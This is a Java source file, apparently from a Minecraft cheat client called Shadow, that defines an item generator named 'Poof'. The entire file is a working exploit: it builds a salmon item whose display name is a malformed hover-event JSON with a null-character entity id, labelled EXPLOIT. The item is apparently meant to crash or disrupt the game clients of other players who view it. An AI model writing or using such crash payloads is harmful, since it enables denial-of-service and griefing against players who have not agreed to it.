/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.items.impl;

import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.shadow.client.feature.items.Item;
import net.shadow.client.feature.items.Option;

public class Poof extends Item {
    final Option<String> name = new Option<>("itemName", "Sam the Salmon", String.class);

    public Poof() {
        super("Poof", "the");
    }

    @Override
    public ItemStack generate() {
        String EXPLOIT = "{\"hoverEvent\":{\"action\":\"show_entity\",\"contents\":{\"type\":\"minecraft:bat\",\"id\":\"\0\"}},\"text\":\"" + name.getValue() + "\"}";
        ItemStack stack = new ItemStack(Items.SALMON);
        NbtCompound display = stack.getOrCreateSubNbt("display");
        display.putString("Name", EXPLOIT);
        return stack;
    }
}
